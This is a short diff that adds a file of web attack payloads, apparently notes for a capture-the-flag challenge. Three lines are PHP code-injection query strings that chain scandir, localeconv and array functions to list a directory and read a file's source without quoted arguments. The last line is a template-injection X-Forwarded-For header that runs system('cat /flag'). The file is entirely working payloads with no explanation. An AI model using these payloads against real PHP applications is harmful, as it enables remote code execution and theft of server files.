@@ -1,0 +1,5 @@
+?exp=print_r(array_reverse(scandir(current(localeconv()))));
+?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
+?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));
+
+X-Forwarded-For: {{system('cat /flag')}}
